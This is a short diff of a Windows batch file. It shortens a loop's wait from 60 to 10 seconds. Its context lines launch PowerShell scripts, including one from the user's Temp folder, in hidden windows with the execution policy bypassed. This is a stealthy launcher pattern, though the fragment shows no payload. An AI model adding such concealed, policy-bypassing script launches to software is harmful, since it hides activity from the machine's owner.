@@ -12,7 +12,7 @@ if exist "%sp1%" (
    start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
 )
 
-timeout /t 60 >nul
+timeout /t 10 >nul
 start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\stop.ps1"
 timeout /t 1 >nul
 goto loop
